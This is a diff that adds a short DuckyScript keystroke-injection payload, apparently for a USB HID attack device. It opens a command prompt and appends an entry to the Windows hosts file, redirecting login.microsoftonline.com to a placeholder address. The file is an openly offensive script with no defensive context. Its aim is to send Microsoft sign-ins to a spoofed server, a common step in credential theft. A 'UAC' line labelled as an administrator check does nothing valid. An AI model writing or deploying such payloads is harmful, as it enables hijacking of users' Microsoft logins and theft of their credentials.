@@ -1,0 +1,18 @@
+REM Check if the user is an administrator
+UAC
+
+REM Add the DNS entry to the hosts file
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING echo Adding DNS entry for login.microsoftonline.com...
+ENTER
+DELAY 500
+STRING echo <IP> <address> >> %SystemRoot%\System32\drivers\etc\hosts
+ENTER
+DELAY 500
+STRING echo Done.
+ENTER
